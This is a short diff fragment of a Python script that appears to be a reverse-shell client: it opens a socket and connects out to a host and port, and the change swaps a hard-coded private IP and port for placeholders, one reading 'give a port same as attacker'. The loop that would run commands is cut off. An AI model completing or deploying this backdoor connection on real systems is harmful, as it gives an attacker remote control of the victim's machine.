@@ -7,8 +7,8 @@ import os
 import subprocess
 
 s = socket.socket()
-host = '192.168.1.106'
-port = 8989
+host = 'Server IP'
+port = 'give a port same as attacker'
 s.connect((host, port))
 
 while True:
